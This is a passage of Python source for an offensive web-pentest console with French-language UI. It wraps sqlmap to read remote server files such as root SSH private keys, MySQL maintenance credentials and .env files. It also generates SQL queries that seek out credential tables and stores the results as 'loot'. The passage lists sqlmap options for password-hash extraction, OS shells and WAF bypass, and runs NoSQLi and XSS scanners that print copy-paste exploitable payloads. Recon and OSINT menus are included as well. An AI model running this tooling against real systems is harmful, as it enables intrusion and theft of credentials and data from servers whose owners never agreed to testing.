            ("/var/www/html/index.php", "Page d'accueil"),
            ("/var/www/html/config.php", "Config PHP (credentials BDD)"),
            ("/var/www/html/db.php", "Connexion BDD"),
            ("/var/www/html/.htaccess", "Regles Apache"),
            ("/var/www/html/wp-config.php", "Config WordPress (si WP)"),
        ]
        # Add source of the vulnerable page if we know the path
        if self.current_target:
            from urllib.parse import urlparse
            parsed = urlparse(self.current_target.get("url", ""))
            if parsed.path and parsed.path != "/":
                web_paths.insert(0, (f"/var/www/html{parsed.path}", f"Code source de la page vulnerable"))
        suggestions.append(("Serveur Web", web_paths))

        # DBMS detection
        db_paths = []
        if "mysql" in dbms_info or "maria" in dbms_info or not dbms_info:
            db_paths += [
                ("/etc/mysql/my.cnf", "Config MySQL"),
                ("/etc/mysql/debian.cnf", "Credentials MySQL Debian (maintenance)"),
            ]
        if "postgres" in dbms_info:
            db_paths += [
                ("/etc/postgresql/main/postgresql.conf", "Config PostgreSQL"),
                ("/etc/postgresql/main/pg_hba.conf", "Auth PostgreSQL"),
            ]
        if "mssql" in dbms_info or "microsoft" in dbms_info:
            db_paths += [
                ("C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\sqlservr.exe", "Binaire MSSQL"),
            ]
        if db_paths:
            suggestions.append(("Base de donnees", db_paths))

        # Technology-specific
        tech_paths = []
        if "radius" in dbms_info or "radius" in tech_info or any("radius" in db.lower() for db in self.discovered_dbs):
            tech_paths += [
                ("/etc/freeradius/radiusd.conf", "Config principale RADIUS"),
                ("/etc/freeradius/sql.conf", "Credentials MySQL RADIUS"),
                ("/etc/freeradius/clients.conf", "Clients RADIUS (routeurs)"),
                ("/etc/freeradius/users", "Utilisateurs RADIUS locaux"),
            ]
        if "php" in tech_info:
            tech_paths.append(("/etc/php5/apache2/php.ini", "Config PHP"))
            tech_paths.append(("/etc/php/7.0/apache2/php.ini", "Config PHP 7"))
        if "node" in tech_info or "express" in tech_info:
            tech_paths.append(("/var/www/html/package.json", "Config Node.js"))
            tech_paths.append(("/var/www/html/.env", "Variables d'environnement"))
        if "python" in tech_info or "django" in tech_info or "flask" in tech_info:
            tech_paths.append(("/var/www/html/settings.py", "Config Django/Flask"))
            tech_paths.append(("/var/www/html/.env", "Variables d'environnement"))
        if tech_paths:
            suggestions.append(("Technologie detectee", tech_paths))

        # Always include SSH/Cron
        suggestions.append(("SSH / Cron", [
            ("/root/.bash_history", "Historique commandes root"),
            ("/etc/crontab", "Taches planifiees"),
            ("/root/.ssh/id_rsa", "Cle privee SSH root"),
            ("/etc/ssh/sshd_config", "Config SSH"),
        ]))

        # Enrich with AI-suggested paths from recon
        try:
            ai = AIAnalyzer(self.output_dir)
            ai.load_all_data()
            ai_paths = ai.suggest_file_paths()
            if ai_paths:
                ai_entries = []
                existing = set()
                for cat_paths in suggestions:
                    for path_tuple in cat_paths[1]:
                        existing.add(path_tuple[0])
                for cat, path, desc in ai_paths:
                    if path not in existing:
                        ai_entries.append((path, f"[IA] {desc}"))
                        existing.add(path)
                if ai_entries:
                    suggestions.append(("Suggestions IA", ai_entries))
        except Exception:
            pass

        return suggestions

    def file_read(self):
        console.clear()
        if not self._ensure_target():
            return

        suggestions = self._build_file_suggestions()

        console.print("[bold]Lecture de fichier sur le serveur[/bold]\n")

        # Build title from detected tech
        server_info = self.loot.data.get("server_info", {}) if self.loot.data else {}
        tech_parts = [v for v in [server_info.get("OS", ""), server_info.get("Web Server", ""), server_info.get("DBMS", "")] if v]
        tech_label = " / ".join(tech_parts) if tech_parts else "Serveur inconnu"
        table = Table(title=f"Fichiers courants ({tech_label})", border_style="dim")
        table.add_column("#", width=3)
        table.add_column("Chemin", style="cyan")
        table.add_column("Description")

        flat_paths = []
        for category, paths in suggestions:
            table.add_row("", f"[bold yellow]--- {category} ---[/bold yellow]", "")
            for path, desc in paths:
                flat_paths.append(path)
                table.add_row(str(len(flat_paths)), path, desc)

        console.print(table)

        console.print("\n[dim]Tapez un numero du tableau ou un chemin personnalise[/dim]")
        choice = Prompt.ask("[bold]Fichier a lire")

        # Allow selecting by number
        if choice.isdigit() and 1 <= int(choice) <= len(flat_paths):
            filepath = flat_paths[int(choice) - 1]
        else:
            filepath = choice

        console.print(Panel(
            f"[bold]Fichier:[/bold] {filepath}\n"
            f"[bold]Action:[/bold] Lecture distante (--file-read)",
            title="File Read",
            border_style="cyan",
        ))

        args = self._build_target_args() + ["--file-read", filepath]
        output = self._run_sqlmap(args)

        # Find the local file where content was saved and read it
        saved_file = None
        for line in output:
            if "saved to" in line.lower() or "file saved" in line.lower():
                console.print(f"\n[bold green]{line}[/bold green]")
                # Extract file path from line
                for part in line.split("'"):
                    if os.path.sep in part or "/" in part:
                        if os.path.exists(part.strip()):
                            saved_file = part.strip()

        # Try to read and display the content
        file_content = ""
        if saved_file and os.path.exists(saved_file):
            try:
                with open(saved_file, "r", encoding="utf-8", errors="replace") as f:
                    file_content = f.read()
                console.print(Panel(file_content[:2000], title=f"Contenu: {filepath}", border_style="green"))
            except Exception:
                pass

        # Save to loot
        if file_content:
            self.loot.add_raw("file", filepath, file_content)
            console.print(f"  [dim]Sauvegarde dans le loot[/dim]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _build_query_suggestions(self):
        """Build dynamic SQL query suggestions based on discovered DBs/tables/columns."""
        suggestions = []

        # Always include generic reconnaissance queries
        suggestions.append(("User et version DBMS", "SELECT user(), @@version, @@datadir"))
        suggestions.append(("Privileges utilisateur", "SELECT grantee, privilege_type FROM information_schema.user_privileges"))
        suggestions.append(("Toutes les bases de donnees", "SELECT schema_name FROM information_schema.schemata"))

        if self.discovered_dbs:
            # Add per-database queries
            for db in self.discovered_dbs:
                if db.lower() in ("information_schema", "mysql", "performance_schema", "sys"):
                    continue
                suggestions.append(
                    (f"Tables de [{db}]",
                     f"SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema='{db}'")
                )

            # Add queries for discovered tables
            for db_key, tables in self.discovered_tables.items():
                for db_name, tbl_name in tables:
                    if db_name.lower() in ("information_schema", "mysql", "performance_schema", "sys"):
                        continue
                    # Check if we have columns for this table
                    col_key = f"{db_name}.{tbl_name}"
                    cols = self.discovered_columns.get(col_key, [])
                    if cols:
                        col_names = ", ".join(c[0] for c in cols[:8])
                        suggestions.append(
                            (f"Donnees de {db_name}.{tbl_name}",
                             f"SELECT {col_names} FROM {db_name}.{tbl_name} LIMIT 50")
                        )
                    else:
                        suggestions.append(
                            (f"Apercu de {db_name}.{tbl_name}",
                             f"SELECT * FROM {db_name}.{tbl_name} LIMIT 20")
                        )

                    # Auto-detect credential-like tables
                    cred_keywords = ("user", "login", "auth", "account", "member", "admin", "credential", "pass", "radcheck")
                    if any(kw in tbl_name.lower() for kw in cred_keywords):
                        suggestions.append(
                            (f"Identifiants dans {db_name}.{tbl_name}",
                             f"SELECT * FROM {db_name}.{tbl_name} LIMIT 100")
                        )

                    # Auto-detect config/settings tables
                    config_keywords = ("config", "setting", "option", "param", "nas", "portail", "site")
                    if any(kw in tbl_name.lower() for kw in config_keywords):
                        suggestions.append(
                            (f"Config dans {db_name}.{tbl_name}",
                             f"SELECT * FROM {db_name}.{tbl_name} LIMIT 50")
                        )
        else:
            # No DBs discovered yet - suggest discovering them first
            suggestions.append(("Lister toutes les tables (base courante)", "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"))
            suggestions.append(("Colonnes de toutes les tables", "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()"))

        # Enrich with AI-generated queries from recon data
        try:
            ai = AIAnalyzer(self.output_dir)
            ai.load_all_data()
            smart = ai.get_smart_queries(self.discovered_dbs, self.discovered_tables)
            for desc, query in smart:
                if not query.startswith("--"):  # Skip comments
                    suggestions.append((f"[IA] {desc}", query))
        except Exception:
            pass

        # Deduplicate by query
        seen = set()
        unique = []
        for desc, query in suggestions:
            if query not in seen:
                seen.add(query)
                unique.append((desc, query))

        return unique

    def sql_query(self):
        console.clear()
        if not self._ensure_target():
            return

        suggestions = self._build_query_suggestions()

        console.print("[bold]Requete SQL formatee[/bold]\n")

        table = Table(title="Requetes suggerees", border_style="dim")
        table.add_column("#", width=3)
        table.add_column("Description", style="cyan")
        table.add_column("Requete", style="dim", max_width=70)

        for idx, (desc, query) in enumerate(suggestions, 1):
            table.add_row(str(idx), desc, query)

        console.print(table)
        console.print("\n[dim]Tapez un numero ou votre propre requete SQL[/dim]")

        choice = Prompt.ask("[bold]SQL")

        if choice.isdigit() and 1 <= int(choice) <= len(suggestions):
            query = suggestions[int(choice) - 1][1]
            desc = suggestions[int(choice) - 1][0]
        else:
            query = choice
            desc = "Requete personnalisee"

        console.print(f"\n  [cyan]{desc}[/cyan]")
        console.print(f"  [dim]{query}[/dim]\n")

        args = self._build_target_args() + ["--sql-query", query]
        output = self._run_sqlmap(args)

        # Parse sqlmap table output and reformat with rich
        rows = []
        headers = []
        in_table = False
        separator_count = 0

        for line in output:
            stripped = line.strip()
            # sqlmap outputs tables with [*] prefix or +---+---+ borders
            if stripped.startswith("+") and "---" in stripped:
                separator_count += 1
                in_table = True
                continue
            if in_table and "|" in stripped:
                cells = [c.strip() for c in stripped.split("|") if c.strip() != ""]
                if not headers:
                    headers = cells
                else:
                    rows.append(cells)
            # Also parse [*] single-value output
            if stripped.startswith("[*]") and not in_table:
                val = stripped[3:].strip()
                if val:
                    rows.append([val])

        if headers or rows:
            result_table = Table(title="Resultat", border_style="green", show_lines=True)
            if headers:
                for h in headers:
                    result_table.add_column(h, style="bold")
                for row in rows:
                    # Pad row if needed
                    while len(row) < len(headers):
                        row.append("")
                    result_table.add_row(*row[:len(headers)])
            else:
                result_table.add_column("Valeur", style="bold")
                for row in rows:
                    result_table.add_row(row[0])
            console.print(result_table)

            # Save to loot
            if headers:
                loot_data = [dict(zip(headers, row)) for row in rows]
            else:
                loot_data = [{"value": row[0]} for row in rows]
            self.loot.add_entry("query", desc, loot_data, columns=headers, query=query)
            console.print(f"  [dim]Sauvegarde dans le loot ({self.loot.get_html_path()})[/dim]")
        else:
            console.print("[yellow]Pas de resultat ou format non reconnu. Voir la sortie brute ci-dessus.[/yellow]")

        # Loop: ask for another query or return
        while True:
            console.print()
            next_q = Prompt.ask("[bold]Autre requete SQL (vide = retour menu)")
            if not next_q.strip():
                break

            if next_q.isdigit() and 1 <= int(next_q) <= len(suggestions):
                query = suggestions[int(next_q) - 1][1]
                console.print(f"  [dim]{query}[/dim]\n")
            else:
                query = next_q

            args = self._build_target_args() + ["--sql-query", query]
            output = self._run_sqlmap(args)

            rows = []
            headers = []
            in_table = False
            separator_count = 0

            for line in output:
                stripped = line.strip()
                if stripped.startswith("+") and "---" in stripped:
                    separator_count += 1
                    in_table = True
                    continue
                if in_table and "|" in stripped:
                    cells = [c.strip() for c in stripped.split("|") if c.strip() != ""]
                    if not headers:
                        headers = cells
                    else:
                        rows.append(cells)
                if stripped.startswith("[*]") and not in_table:
                    val = stripped[3:].strip()
                    if val:
                        rows.append([val])

            if headers or rows:
                result_table = Table(title="Resultat", border_style="green", show_lines=True)
                if headers:
                    for h in headers:
                        result_table.add_column(h, style="bold")
                    for row in rows:
                        while len(row) < len(headers):
                            row.append("")
                        result_table.add_row(*row[:len(headers)])
                else:
                    result_table.add_column("Valeur", style="bold")
                    for row in rows:
                        result_table.add_row(row[0])
                console.print(result_table)

                # Save to loot
                if headers:
                    loot_data = [dict(zip(headers, row)) for row in rows]
                else:
                    loot_data = [{"value": row[0]} for row in rows]
                self.loot.add_entry("query", query[:60], loot_data, columns=headers, query=query)
                console.print(f"  [dim]Sauvegarde dans le loot[/dim]")
            else:
                console.print("[yellow]Pas de resultat ou format non reconnu.[/yellow]")

    def sql_shell(self):
        console.clear()
        if not self._ensure_target():
            return

        console.print(Panel(
            "[bold]Shell SQL interactif[/bold]\n\n"
            "Vous allez entrer dans le shell SQL de sqlmap.\n"
            "Tapez vos requetes SQL directement.\n"
            "Tapez [bold]q[/bold] ou [bold]exit[/bold] pour quitter.\n\n"
            "[yellow]Le shell s'ouvre dans votre terminal directement.[/yellow]",
            title="SQL Shell",
            border_style="cyan",
        ))

        if not Confirm.ask("[bold]Lancer le shell SQL ?[/bold]", default=True):
            return

        args = self._build_target_args() + ["--sql-shell"]

        # Run interactively (NOT --batch, user needs to type SQL)
        cmd = self.sqlmap_path.split() + args
        console.print(f"\n  [bold cyan]$[/bold cyan] {' '.join(cmd)}\n")
        console.print("[dim]--- Debut du shell SQL (Ctrl+C pour quitter) ---[/dim]\n")

        try:
            subprocess.run(cmd, timeout=600)
        except subprocess.TimeoutExpired:
            console.print("\n[yellow]Timeout.[/yellow]")
        except KeyboardInterrupt:
            console.print("\n[dim]Shell interrompu.[/dim]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def custom_sqlmap(self):
        console.clear()
        if not self._ensure_target():
            return

        console.print("[bold]Commande sqlmap personnalisee[/bold]\n")
        console.print("[dim]Arguments supplementaires a ajouter a la commande de base.[/dim]")
        console.print("[dim]La cible et --batch sont deja inclus.[/dim]\n")

        console.print("[bold]Exemples:[/bold]")
        examples = [
            ("--dbs", "Lister les bases"),
            ("--tables -D mabase", "Tables d'une base"),
            ("--dump -D mabase -T users", "Dump une table"),
            ("--dump -D mabase -T users -C username,password", "Dump colonnes specifiques"),
            ("--passwords", "Extraire les hash de mots de passe"),
            ("--current-user", "Utilisateur courant"),
            ("--current-db", "Base courante"),
            ("--is-dba", "Verifier si admin DB"),
            ("--privileges", "Privileges de l'utilisateur"),
            ("--roles", "Roles de l'utilisateur"),
            ("--os-shell", "Shell OS (si possible)"),
            ("--file-read /etc/passwd", "Lire un fichier"),
            ("--schema", "Schema complet de la base"),
            ("--count -D mabase", "Compter les lignes par table"),
            ("--search -C password", "Chercher une colonne dans toutes les bases"),
            ("--sql-query \"SELECT version()\"", "Executer une requete SQL"),
            ("--technique=BEUSTQ", "Tester toutes les techniques"),
            ("--tamper=randomcase,space2comment", "Bypass WAF"),
            ("--level=5 --risk=3", "Scan agressif maximum"),
        ]

        table = Table(border_style="dim", show_header=True)
        table.add_column("Arguments", style="cyan")
        table.add_column("Description")
        for arg, desc in examples:
            table.add_row(arg, desc)
        console.print(table)

        custom_args = Prompt.ask("\n[bold]Arguments sqlmap")
        if not custom_args.strip():
            return

        args = self._build_target_args() + custom_args.split()
        self._run_sqlmap(args)

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def open_report(self):
        html_path = os.path.join(self.output_dir, "report.html")
        if os.path.exists(html_path):
            abs_path = os.path.abspath(html_path)
            console.print(f"[green]Ouverture de {abs_path}[/green]")
            try:
                os.startfile(abs_path)
            except Exception:
                console.print(f"[yellow]Ouvrez manuellement: {abs_path}[/yellow]")
        else:
            console.print("[red]Rapport HTML introuvable.[/red]")
        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def open_loot(self):
        # Import any existing CSV dumps first
        self._import_csv_dumps_to_loot()

        # Save dynamically collected server info (not hardcoded)
        target_url = self.report.get("target", "") if self.report else ""
        if target_url:
            self.loot.set_server_info({"Target": target_url})

        html_path = self.loot.get_html_path()
        abs_path = os.path.abspath(html_path)

        entries = self.loot.get_entries()
        console.print(Panel(
            f"[bold]Cible:[/bold] {self.loot.target}\n"
            f"[bold]Donnees collectees:[/bold] {len(entries)} entrees\n"
            f"[bold]Fichier:[/bold] {abs_path}",
            title="Loot Page",
            border_style="green",
        ))

        if os.path.exists(html_path):
            console.print(f"[green]Ouverture du loot...[/green]")
            try:
                os.startfile(abs_path)
            except Exception:
                console.print(f"[yellow]Ouvrez manuellement: {abs_path}[/yellow]")
        else:
            console.print("[yellow]Aucune donnee dans le loot. Lancez des requetes d'abord.[/yellow]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    # ═══════════════════════════════════════════
    # NoSQLi SCANNER
    # ═══════════════════════════════════════════

    def nosqli_scan(self):
        console.clear()
        console.print(Panel(
            "[bold]Scanner NoSQLi[/bold]\n\n"
            "Teste les injections NoSQL (MongoDB, CouchDB):\n"
            "  - Injection d'operateurs ($ne, $gt, $regex, $exists)\n"
            "  - Bypass d'authentification NoSQL\n"
            "  - Injection JavaScript ($where)\n"
            "  - Detection d'erreurs MongoDB\n\n"
            "[dim]Entrez l'URL cible avec parametres, ou utilisez la cible active.[/dim]",
            title="NoSQL Injection Scanner",
            border_style="magenta",
        ))

        # Get target URL
        url = ""
        method = "GET"
        post_data = None

        if self.current_target:
            url = self.current_target.get("url", "")
            method = self.current_target.get("method", "GET")
            console.print(f"\n[bold]Cible active:[/bold] {url[:80]}")
            use_current = Confirm.ask("[bold]Utiliser cette cible ?[/bold]", default=True)
            if not use_current:
                url = ""

        if not url:
            url = Prompt.ask("[bold]URL cible (avec parametres)")
            if not url.strip():
                return

        method = Prompt.ask("[bold]Methode HTTP", choices=["GET", "POST", "get", "post"], default=method).upper()

        if method == "POST":
            console.print("\n[dim]Format du body: key=value&key2=value2  ou  JSON[/dim]")
            post_data = Prompt.ask("[bold]Body POST (vide si dans l'URL)", default="")
            if not post_data.strip():
                post_data = None

        # Delay configuration
        delay = float(Prompt.ask("[bold]Delai entre requetes (sec)", default="1"))

        console.print(Panel(
            f"[bold]URL:[/bold] {url[:80]}\n"
            f"[bold]Methode:[/bold] {method}\n"
            f"[bold]Delai:[/bold] {delay}s",
            title="Configuration NoSQLi",
            border_style="magenta",
        ))

        if not Confirm.ask("[bold yellow]Lancer le scan NoSQLi ?[/bold yellow]", default=True):
            return

        scanner = NoSQLiScanner(delay=delay)
        results = scanner.scan_url(url, method=method, data=post_data)

        # Display results
        if results:
            console.print(f"\n[bold red]{'=' * 50}[/bold red]")
            console.print(f"[bold red]{len(results)} vulnerabilite(s) NoSQLi trouvee(s) ![/bold red]")
            console.print(f"[bold red]{'=' * 50}[/bold red]\n")

            table = Table(title="Resultats NoSQLi", border_style="red", show_lines=True)
            table.add_column("#", width=3)
            table.add_column("Param", style="bold")
            table.add_column("Technique")
            table.add_column("Confiance", width=10)
            table.add_column("Description", max_width=40)
            table.add_column("Raison", max_width=40)

            for idx, r in enumerate(results, 1):
                conf_style = {"HIGH": "bold red", "MEDIUM": "yellow", "LOW": "dim"}.get(r["confidence"], "dim")
                table.add_row(
                    str(idx),
                    r["param"],
                    r["technique"],
                    f"[{conf_style}]{r['confidence']}[/{conf_style}]",
                    r["description"],
                    r.get("reason", ""),
                )
            console.print(table)

            # Save to loot
            loot_data = [{"param": r["param"], "technique": r["technique"],
                         "confidence": r["confidence"], "description": r["description"],
                         "reason": r.get("reason", "")} for r in results]
            self.loot.add_entry("nosqli", f"NoSQLi - {urlparse(url).netloc}", loot_data)
            console.print(f"\n  [dim]Sauvegarde dans le loot[/dim]")
        else:
            console.print("\n[green]Aucune vulnerabilite NoSQLi detectee.[/green]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    # ═══════════════════════════════════════════
    # XSS SCANNER
    # ═══════════════════════════════════════════

    def xss_scan(self):
        console.clear()
        console.print(Panel(
            "[bold]Scanner XSS[/bold]\n\n"
            "Teste les vulnerabilites Cross-Site Scripting:\n"
            "  - [cyan]Reflected XSS[/cyan] : reflexion de payloads dans la reponse\n"
            "  - [cyan]DOM-based XSS[/cyan] : analyse des sources/sinks JavaScript\n"
            "  - Detection du contexte (HTML, attribut, JavaScript)\n"
            "  - Payloads adaptes au contexte detecte\n"
            "  - Test de bypass de filtres (encoding, tag mutation)\n\n"
            "[dim]3 phases: reflexion -> payloads -> DOM analysis[/dim]",
            title="XSS Scanner",
            border_style="magenta",
        ))

        # Get target URL
        url = ""
        method = "GET"
        post_data = None

        if self.current_target:
            url = self.current_target.get("url", "")
            method = self.current_target.get("method", "GET")
            console.print(f"\n[bold]Cible active:[/bold] {url[:80]}")
            use_current = Confirm.ask("[bold]Utiliser cette cible ?[/bold]", default=True)
            if not use_current:
                url = ""

        if not url:
            url = Prompt.ask("[bold]URL cible (avec parametres)")
            if not url.strip():
                return

        method = Prompt.ask("[bold]Methode HTTP", choices=["GET", "POST", "get", "post"], default=method).upper()

        if method == "POST":
            console.print("\n[dim]Format du body: key=value&key2=value2[/dim]")
            post_data = Prompt.ask("[bold]Body POST (vide si dans l'URL)", default="")
            if not post_data.strip():
                post_data = None

        # Options
        delay = float(Prompt.ask("[bold]Delai entre requetes (sec)", default="0.5"))

        # Show detected params
        from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
        parsed = _urlparse(url)
        params = _parse_qs(parsed.query, keep_blank_values=True)
        if params:
            console.print(f"\n[bold]Parametres detectes:[/bold] {', '.join(params.keys())}")
            specific = Prompt.ask("[bold]Tester un parametre specifique ? (vide = tous)", default="")
            params_to_test = [specific] if specific.strip() else None
        else:
            params_to_test = None

        console.print(Panel(
            f"[bold]URL:[/bold] {url[:80]}\n"
            f"[bold]Methode:[/bold] {method}\n"
            f"[bold]Params:[/bold] {', '.join(params.keys()) if params else 'aucun'}\n"
            f"[bold]Delai:[/bold] {delay}s",
            title="Configuration XSS",
            border_style="magenta",
        ))

        if not Confirm.ask("[bold yellow]Lancer le scan XSS ?[/bold yellow]", default=True):
            return

        scanner = XSSScanner(delay=delay)
        results = scanner.scan_url(url, method=method, data=post_data, params_to_test=params_to_test)

        # Display results
        if results:
            console.print(f"\n[bold red]{'=' * 50}[/bold red]")
            console.print(f"[bold red]{len(results)} vulnerabilite(s) XSS trouvee(s) ![/bold red]")
            console.print(f"[bold red]{'=' * 50}[/bold red]\n")

            table = Table(title="Resultats XSS", border_style="red", show_lines=True)
            table.add_column("#", width=3)
            table.add_column("Param", style="bold")
            table.add_column("Type")
            table.add_column("Confiance", width=10)
            table.add_column("Contexte")
            table.add_column("Payload", max_width=50)

            for idx, r in enumerate(results, 1):
                conf_style = {"HIGH": "bold red", "MEDIUM": "yellow", "LOW": "dim"}.get(r["confidence"], "dim")
                table.add_row(
                    str(idx),
                    r["param"],
                    r["type"],
                    f"[{conf_style}]{r['confidence']}[/{conf_style}]",
                    r.get("context", ""),
                    r.get("payload", "")[:50],
                )
            console.print(table)

            # Show exploitable payloads
            high_vulns = [r for r in results if r["confidence"] == "HIGH"]
            if high_vulns:
                console.print(Panel(
                    "\n".join(f"[bold]{r['param']}[/bold]: {r['payload']}" for r in high_vulns[:5]),
                    title="Payloads exploitables (copier-coller)",
                    border_style="red",
                ))

            # DOM XSS details
            dom_vulns = [r for r in results if r["type"] == "dom_xss"]
            if dom_vulns:
                for r in dom_vulns:
                    console.print(Panel(
                        f"[bold]Sources:[/bold] {', '.join(r.get('sources', [])[:5])}\n"
                        f"[bold]Sinks:[/bold] {', '.join(r.get('sinks', [])[:5])}",
                        title="DOM-XSS - Sources & Sinks",
                        border_style="yellow",
                    ))

            # Save to loot
            loot_data = [{"param": r["param"], "type": r["type"],
                         "confidence": r["confidence"], "payload": r.get("payload", ""),
                         "context": r.get("context", "")} for r in results]
            self.loot.add_entry("xss", f"XSS - {parsed.netloc}", loot_data)
            console.print(f"\n  [dim]Sauvegarde dans le loot[/dim]")
        else:
            console.print("\n[green]Aucune vulnerabilite XSS detectee.[/green]")

        # Option to test a custom payload
        while True:
            console.print()
            custom = Prompt.ask("[bold]Tester un payload custom ? (vide = retour menu)")
            if not custom.strip():
                break

            param = Prompt.ask("[bold]Sur quel parametre ?", default=list(params.keys())[0] if params else "")
            if not param:
                continue

            modified = dict(params)
            modified[param] = [custom]
            from urllib.parse import urlencode as _urlencode, urlunparse as _urlunparse
            new_query = _urlencode(modified, doseq=True)
            test_url = _urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            console.print(f"  [dim]Test: {test_url[:100]}[/dim]")
            try:
                import requests as _requests
                resp = _requests.get(test_url, verify=False, timeout=15)
                if custom in resp.text:
                    console.print(f"  [bold red]REFLETE SANS FILTRE ![/bold red]")
                    # Show context
                    idx = resp.text.index(custom)
                    context = resp.text[max(0, idx-50):idx+len(custom)+50]
                    console.print(Panel(context, title="Contexte de reflexion", border_style="red"))
                else:
                    console.print(f"  [yellow]Payload filtre ou non reflete.[/yellow]")
            except Exception as e:
                console.print(f"  [red]Erreur: {e}[/red]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    # ═══════════════════════════════════════════
    # RECONNAISSANCE
    # ═══════════════════════════════════════════

    def _get_domain(self):
        """Extract domain from report target, current target, or ask user."""
        target_url = self.report.get("target", "") if self.report else ""
        if not target_url and self.current_target:
            target_url = self.current_target.get("url", "")

        if target_url:
            parsed = urlparse(target_url)
            domain = parsed.netloc.split(":")[0]
            if domain:
                return domain, target_url

        domain = Prompt.ask("[bold]Domaine cible (ex: example.com)")
        if not domain.strip():
            return None, None
        # Clean up if user pasted a URL
        if "://" in domain:
            parsed = urlparse(domain)
            return parsed.netloc.split(":")[0], domain
        return domain.strip(), f"https://{domain.strip()}"

    def recon_menu(self):
        console.clear()
        domain, target_url = self._get_domain()
        if not domain:
            return

        console.print(Panel(
            f"[bold]Domaine:[/bold] {domain}\n\n"
            "[bold]Modules disponibles:[/bold]\n"
            "  [cyan][1][/cyan] Scan complet (tout lancer)\n"
            "  [cyan][2][/cyan] Sous-domaines (crt.sh + subfinder + DNS)\n"
            "  [cyan][3][/cyan] Tech fingerprint (headers, CMS, services)\n"
            "  [cyan][4][/cyan] Discovery directories/fichiers\n"
            "  [cyan][5][/cyan] Port scan (nmap ou socket)\n"
            "  [cyan][6][/cyan] Wayback Machine (URLs historiques)\n"
            "  [cyan][7][/cyan] Nuclei (scanner de vulns)\n"
            "  [cyan][0][/cyan] Retour",
            title="Reconnaissance",
            border_style="blue",
        ))

        choice = Prompt.ask("[bold]Module", choices=["0","1","2","3","4","5","6","7"], default="1")

        if choice == "0":
            return
        elif choice == "1":
            console.print("\n[bold]Lancement de la reconnaissance complete...[/bold]")
            recon = FullRecon(target_url, self.output_dir)
            results = recon.run_full()
            self._save_recon_to_loot(results)
        elif choice == "2":
            finder = SubdomainFinder(domain)
            subs = finder.run_all()
            if subs:
                table = Table(title=f"Sous-domaines de {domain}", border_style="green")
                table.add_column("#", width=4)
                table.add_column("Sous-domaine", style="bold")
                for idx, sub in enumerate(subs[:50], 1):
                    table.add_row(str(idx), sub)
                console.print(table)
                self.loot.add_entry("recon", f"Sous-domaines - {domain}",
                                   [{"subdomain": s} for s in subs], columns=["subdomain"])
        elif choice == "3":
            fp = TechFingerprinter()
            techs = fp.fingerprint(target_url)
            if techs:
                table = Table(title="Technologies detectees", border_style="green", show_lines=True)
                table.add_column("Technologie", style="bold")
                table.add_column("Source")
                table.add_column("Detail", max_width=50)
                for tech, info in techs.items():
                    style = "bold red" if tech.startswith("EXPOSED") or tech.startswith("MISSING") else "green"
                    table.add_row(f"[{style}]{tech}[/{style}]", info["source"], info["value"][:50])
                console.print(table)
                self.loot.add_entry("recon", f"Technologies - {domain}",
                                   [{"tech": k, "source": v["source"], "detail": v["value"]} for k, v in techs.items()])
        elif choice == "4":
            delay = float(Prompt.ask("[bold]Delai entre requetes (sec)", default="0.2"))
            buster = DirBuster(delay=delay)
            found = buster.scan(target_url)
            if found:
                self.loot.add_entry("recon", f"Directories - {domain}",
                                   found, columns=["path", "status", "length"])
        elif choice == "5":
            scanner = PortScanner()
            results = scanner.scan(domain)
            if results:
                self.loot.add_entry("recon", f"Ports - {domain}",
                                   results, columns=["port", "service", "state"])
        elif choice == "6":
            wb = WaybackDiscovery()
            urls = wb.discover(domain)
            if urls:
                table = Table(title="URLs Wayback Machine", border_style="green")
                table.add_column("#", width=4)
                table.add_column("URL", style="cyan", max_width=80)
                for idx, u in enumerate(urls[:40], 1):
                    table.add_row(str(idx), u[:80])
                console.print(table)
                self.loot.add_entry("recon", f"Wayback URLs - {domain}",
                                   [{"url": u} for u in urls], columns=["url"])
        elif choice == "7":
            nuclei = NucleiScanner()
            results = nuclei.scan(target_url)
            if results:
                self.loot.add_entry("recon", f"Nuclei Vulns - {domain}",
                                   results, columns=["severity", "name", "matched_url"])

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _save_recon_to_loot(self, results):
        """Save full recon results to loot."""
        domain = results.get("domain", "?")
        if results.get("subdomains"):
            self.loot.add_entry("recon", f"Sous-domaines - {domain}",
                               [{"subdomain": s} for s in results["subdomains"]])
        if results.get("technologies"):
            self.loot.add_entry("recon", f"Technologies - {domain}",
                               [{"tech": k, "detail": str(v)} for k, v in results["technologies"].items()])
        if results.get("directories"):
            self.loot.add_entry("recon", f"Directories - {domain}",
                               results["directories"])
        if results.get("ports"):
            self.loot.add_entry("recon", f"Ports - {domain}",
                               results["ports"])
        if results.get("wayback_urls"):
            self.loot.add_entry("recon", f"Wayback URLs - {domain}",
                               [{"url": u} for u in results["wayback_urls"][:100]])
        if results.get("nuclei"):
            self.loot.add_entry("recon", f"Nuclei Vulns - {domain}",
                               results["nuclei"])

    # ═══════════════════════════════════════════
    # OSINT
    # ═══════════════════════════════════════════

    def osint_menu(self):
        console.clear()
        domain, target_url = self._get_domain()
        if not domain:
            return

        console.print(Panel(
            f"[bold]Domaine:[/bold] {domain}\n\n"
            "[bold]Modules OSINT:[/bold]\n"
            "  [cyan][1][/cyan] OSINT complet (tout)\n"
            "  [cyan][2][/cyan] DNS (A, AAAA, MX, NS, TXT, SOA)\n"
            "  [cyan][3][/cyan] WHOIS\n"
            "  [cyan][4][/cyan] Headers de securite (score + analyse)\n"
            "  [cyan][5][/cyan] Shodan (requiert API key)\n"
            "  [cyan][6][/cyan] Leak detection (dorks)\n"
            "  [cyan][0][/cyan] Retour",
            title="OSINT",
            border_style="blue",
        ))

        choice = Prompt.ask("[bold]Module", choices=["0","1","2","3","4","5","6"], default="1")

        if choice == "0":
            return
        elif choice == "1":
